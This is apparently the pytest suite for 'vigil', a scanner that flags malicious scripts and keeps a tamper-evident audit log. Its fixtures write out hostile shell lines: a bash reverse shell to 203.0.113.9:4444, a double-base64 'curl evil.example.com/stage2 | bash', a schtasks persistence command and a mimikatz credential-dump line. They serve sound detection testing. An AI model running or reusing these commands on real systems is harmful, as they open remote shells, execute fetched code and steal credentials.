import base64
import json
import os

import pytest

from vigil import reporter
from vigil.main import Config, run_scan, load_config, main


@pytest.fixture(autouse=True)
def _offline(monkeypatch):
    # Force fully-offline, deterministic runs: no keys, no network intel.
    monkeypatch.delenv("VT_API_KEY", raising=False)
    monkeypatch.delenv("ABUSEIPDB_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)


def _cfg(tmp_path, **over):
    c = Config()
    c.cache_path = str(tmp_path / "cache.db")
    c.enable_intel = False
    c.enable_ai = False
    c.enable_yara = False
    for k, v in over.items():
        setattr(c, k, v)
    return c


def test_scan_malicious_script(tmp_path):
    p = tmp_path / "bad.sh"
    p.write_text("#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n")
    report = run_scan(str(p), _cfg(tmp_path))
    assert report["verdict"]["escalate"]
    assert report["verdict"]["band"] in ("HIGH", "MALICIOUS")
    assert any(f["name"] == "reverse_shell_bash" for f in report["findings"])


def test_scan_benign_script(tmp_path):
    p = tmp_path / "ok.sh"
    p.write_text("#!/bin/bash\necho hello world\ndate\n")
    report = run_scan(str(p), _cfg(tmp_path))
    assert not report["verdict"]["escalate"]
    assert report["verdict"]["band"] in ("SAFE", "LOW")


def test_scan_nested_base64_payload_found(tmp_path):
    payload = "curl http://evil.example.com/stage2 | bash"
    once = base64.b64encode(payload.encode()).decode()
    twice = base64.b64encode(once.encode()).decode()
    p = tmp_path / "enc.sh"
    p.write_text(f"echo {twice} | base64 -d | base64 -d | bash\n")
    report = run_scan(str(p), _cfg(tmp_path))
    urls = [i["value"] for i in report["iocs"] if i["ioc_type"] == "url"]
    assert any("evil.example.com" in u for u in urls)
    # provenance: URL came from a decoded layer
    assert report["verdict"]["score"] > 0


def test_report_is_json_serializable(tmp_path):
    p = tmp_path / "bad.sh"
    p.write_text("schtasks /create /tn x /tr calc.exe /sc onlogon\n")
    report = run_scan(str(p), _cfg(tmp_path))
    text = reporter.to_json(report)
    parsed = json.loads(text)
    assert parsed["file"]["sha256"]


def test_terminal_render_no_crash(tmp_path):
    p = tmp_path / "bad.sh"
    p.write_text("mimikatz sekurlsa::logonpasswords\n")
    report = run_scan(str(p), _cfg(tmp_path))
    out = reporter.render_terminal(report, color=False)
    assert "VERDICT" in out
    assert "mimikatz" in out.lower() or "credential" in out.lower()


def test_cache_hit_on_second_scan(tmp_path):
    p = tmp_path / "bad.sh"
    p.write_text("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n")
    cfg = _cfg(tmp_path, use_cache=True)
    first = run_scan(str(p), cfg)
    assert not first["cache_hit"]
    second = run_scan(str(p), cfg)
    assert second["cache_hit"]
    assert second["verdict"]["score"] == first["verdict"]["score"]


def test_unsupported_type_is_honest_not_crash(tmp_path):
    p = tmp_path / "thing.bin"
    p.write_bytes(b"MZ\x90\x00" + b"\x00" * 200)  # PE-ish binary
    report = run_scan(str(p), _cfg(tmp_path))
    assert report["verdict"]["band"] == "SAFE"
    assert any("unsupported" in n or "out of scope" in n
               for n in report["notes"])


def test_archive_reports_worst_member(tmp_path):
    import zipfile
    z = tmp_path / "bundle.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("clean.sh", "#!/bin/bash\necho hi\n")
        zf.writestr("evil.sh", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n")
    report = run_scan(str(z), _cfg(tmp_path))
    assert report["file"]["is_archive"]
    assert report["verdict"]["escalate"]  # worst member drives the verdict
    assert "archive_members" in report


def test_ingest_error_returns_exit_code(tmp_path, capsys):
    code = main(["scan", str(tmp_path / "missing.sh"), "--no-intel", "--no-ai"])
    assert code == 2


def test_cli_scan_exit_code_reflects_verdict(tmp_path, monkeypatch):
    p = tmp_path / "bad.sh"
    p.write_text("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n")
    monkeypatch.chdir(tmp_path)
    code = main(["scan", str(p), "--no-intel", "--no-ai", "--no-cache",
                 "--no-color", "--json"])
    assert code == 1  # escalate -> exit 1


def test_load_config_defaults_when_missing(tmp_path):
    cfg = load_config(str(tmp_path / "nope.yaml"))
    assert cfg.cache_ttl_hours == 24


# --- policy enforcement via config ----------------------------------------

def _write_cfg(tmp_path, body):
    p = tmp_path / "policy.yaml"
    p.write_text(body, encoding="utf-8")
    return str(p)


def test_config_policy_can_enforce_offline(tmp_path):
    pytest.importorskip("yaml")
    cfg = load_config(_write_cfg(tmp_path, "policy:\n  offline: true\n"))
    assert cfg.offline is True
    assert cfg.enable_intel is False
    assert cfg.enable_ai is False
    assert cfg.allow_upload is False
    assert any("enforced by policy" in n for n in cfg.notes)


def test_config_policy_offline_defaults_to_false(tmp_path):
    pytest.importorskip("yaml")
    cfg = load_config(_write_cfg(tmp_path, "policy:\n  offline: false\n"))
    assert cfg.offline is False


def test_config_policy_sets_audit_log(tmp_path):
    pytest.importorskip("yaml")
    cfg = load_config(_write_cfg(
        tmp_path, "policy:\n  audit_log: /var/log/vigil/a.jsonl\n"))
    assert cfg.audit_log.endswith("a.jsonl")


def test_cli_offline_blocks_upload_even_when_upload_passed(tmp_path, capsys):
    """--offline must win over --upload. A policy that can be overridden by
    another flag is not a policy."""
    target = tmp_path / "x.sh"
    target.write_text("#!/bin/bash\ncurl http://example.com/a | sh\n")
    rc = main(["scan", str(target), "--no-color", "--no-cache",
               "--offline", "--upload", "--yes", "--json"])
    assert rc in (0, 1)
    out = capsys.readouterr().out
    report = json.loads(out[out.index("{"):])
    notes = " ".join(report.get("notes", []))
    assert "offline mode" in notes
    # AI narration must not have been used
    assert report["verdict"]["explanation_source"] == "template"


# --- verify-audit command --------------------------------------------------

def test_verify_audit_reports_intact_chain(tmp_path, capsys):
    target = tmp_path / "x.sh"
    target.write_text("#!/bin/bash\necho hi\n")
    log = str(tmp_path / "audit.jsonl")
    main(["scan", str(target), "--no-color", "--no-cache", "--offline",
          "--audit-log", log])
    assert main(["verify-audit", log]) == 0
    assert "INTACT" in capsys.readouterr().out


def test_verify_audit_detects_tampering(tmp_path, capsys):
    target = tmp_path / "x.sh"
    target.write_text("#!/bin/bash\necho hi\n")
    log = str(tmp_path / "audit.jsonl")
    main(["scan", str(target), "--no-color", "--no-cache", "--offline",
          "--audit-log", log])

    lines = open(log).read().splitlines()
    rec = json.loads(lines[0])
    assert rec["verdict"]["band"] == "SAFE"   # precondition
    rec["verdict"]["band"] = "MALICIOUS"      # rewrite history: a real change
    rec["operator"] = "someone-else"
    lines[0] = json.dumps(rec)
    open(log, "w").write("\n".join(lines) + "\n")

    assert main(["verify-audit", log]) == 1
    assert "BROKEN" in capsys.readouterr().err


def test_verify_audit_missing_file_returns_2(tmp_path):
    assert main(["verify-audit", str(tmp_path / "nope.jsonl")]) == 2


def test_scan_writes_audit_record_with_egress_state(tmp_path):
    target = tmp_path / "x.sh"
    target.write_text("#!/bin/bash\necho hi\n")
    log = str(tmp_path / "audit.jsonl")
    main(["scan", str(target), "--no-color", "--no-cache", "--offline",
          "--audit-log", log])
    rec = json.loads(open(log).readline())
    assert rec["event"] == "scan"
    assert rec["egress"] == {"intel": False, "ai": False,
                             "upload": False, "offline": True}
    assert rec["operator"] and rec["host"]
    # the log must never carry evidence text
    assert "matched" not in json.dumps(rec)
